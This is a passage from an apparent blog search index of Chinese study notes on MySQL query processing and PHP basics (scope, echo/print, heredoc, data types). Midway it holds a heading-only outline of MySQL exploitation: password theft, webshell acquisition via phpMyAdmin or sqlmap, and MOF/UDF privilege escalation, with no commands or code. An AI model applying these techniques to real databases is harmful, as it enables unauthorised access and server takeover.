title="查询逻辑"></a>查询逻辑</h5><p>1、连接器：负责跟客户端建立连接、获取权限、维持和管理连接。<br>先连接到数据库上。<br>2、查询缓存<br>拿到一个查询请求，先到查询缓存看看。<br>3、分析器<br>没有命中查询缓存，开始执行语句。分析器开始词法分析和语法分析。<br>4、优化器<br>优化器在表里面有多个索引，决定使用哪个索引，或者多表关联的时候，决定各个表的连接顺序。<br>5、执行器<br>遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。</p><h4 id="MySQL漏洞利用"><a href="#MySQL漏洞利用" class="headerlink" title="MySQL漏洞利用"></a>MySQL漏洞利用</h4><h5 id="1-密码获取"><a href="#1-密码获取" class="headerlink" title="1.密码获取"></a>1.密码获取</h5><p>1.1暴力破解<br>1.2源代码泄露<br>1.3文件包含<br>1.4其他情况</p><h5 id="2-获取webshell"><a href="#2-获取webshell" class="headerlink" title="2.获取webshell"></a>2.获取webshell</h5><p>2.1phpmyadminroot账号获取webshell<br>2.2sqlmap注入点获取webshell</p><h5 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h5><p>3.1mof提权<br>3.2Msf直接mof提权<br>3.3UDF提权</p><h3 id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h3><p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。</p><h3 id="PHP-global-关键字"><a href="#PHP-global-关键字" class="headerlink" title="PHP global 关键字"></a>PHP global 关键字</h3><p>global 关键字用于函数内访问全局变量。</p><p>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字。</p><h3 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h3><p>当一个函数完成时，它的所有变量通常都会被删除。当您希望某个局部变量不要被删除。</p><p>应在您第一次声明变量时使用 static 关键字。</p><h3 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h3><p>参数是通过调用代码将值传递给函数的局部变量。</p><p>参数是在参数列表中声明的，作为函数声明的一部分。</p><h3 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h3><h4 id="echo-和-print-区别"><a href="#echo-和-print-区别" class="headerlink" title="echo 和 print 区别:"></a>echo 和 print 区别:</h4><p>echo - 可以输出一个或多个字符串<br>print - 只允许输出一个字符串，返回值总为 1<br>提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p><h3 id="PHP-EOF-heredoc-使用说明"><a href="#PHP-EOF-heredoc-使用说明" class="headerlink" title="PHP EOF(heredoc) 使用说明"></a>PHP EOF(heredoc) 使用说明</h3><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。</p><p>使用概述：</p><p>1.必须后接分号，否则编译通不过。</p><h5 id="2-EOF-可以用任意其它字符代替，只需保证结束标识与开始标识一致。"><a href="#2-EOF-可以用任意其它字符代替，只需保证结束标识与开始标识一致。" class="headerlink" title="2.EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。"></a>2.EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。</h5><h5 id="3-结束标识必须顶格独自占一行-即必须从行首开始，前后不能衔接任何空白和字符-。"><a href="#3-结束标识必须顶格独自占一行-即必须从行首开始，前后不能衔接任何空白和字符-。" class="headerlink" title="3.结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。"></a>3.结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</h5><p>4.开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</p><p>5,.内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。</p><?phpecho <<<EOF<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`&lt;h1&gt;我的第一个标题&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p &gt;`</span><br></pre></td></tr></table></figure>EOF;// 结束需要独立一行且前后不能空格?><p>PHP数据类型</p><h4 id="PHP-数组"><a href="#PHP-数组" class="headerlink" title="PHP 数组"></a>PHP 数组</h4><p>数组可以在一个变量中存储多个值。</p><h4 id="PHP-对象"><a href="#PHP-对象" class="headerlink" title="PHP 对象"></a>PHP 对象</h4><p>对象数据类型也可以用于存储数据。</p><p>在 PHP 中，对象必须声明。</p><p>首先，必须使用class关键字声明类对象。类是可以包含属性和方法的结构。</p><p>然后在类中定义数据类型，再在实例化的类中使用数据类型。</p><h4 id="PHP-资源类型"><a href="#PHP-资源类型" class="headerlink" title="PHP 资源类型"></a>PHP 资源类型</h4><p>PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
